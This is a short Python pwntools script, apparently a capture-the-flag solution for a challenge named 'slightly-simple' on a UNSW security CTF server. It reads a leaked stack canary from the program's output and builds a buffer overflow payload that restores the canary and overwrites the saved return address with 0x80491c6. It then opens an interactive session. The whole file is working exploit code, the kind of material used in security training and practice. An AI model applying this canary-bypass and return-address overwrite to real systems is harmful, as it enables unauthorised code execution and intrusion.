from pwn import *

# p = process('./slightly-simple')
p = remote('pwn.ctf.unswsecurity.com', 7005)

# obtain the canary value
p.recvuntil('hi\n')
canary = p.recvuntil('\n', drop=True)
canary = b'0x' + canary
canary = int(canary, 16)

payload = b''
# pad until the canary
payload += b'A' * (0x20-0xC)
# overwrite the canary
payload += p32(canary)
# pad till the return address
payload += b'A' * 0xC
# overwrite return address
payload += p32(0x80491c6)

p.sendline(payload)

p.interactive()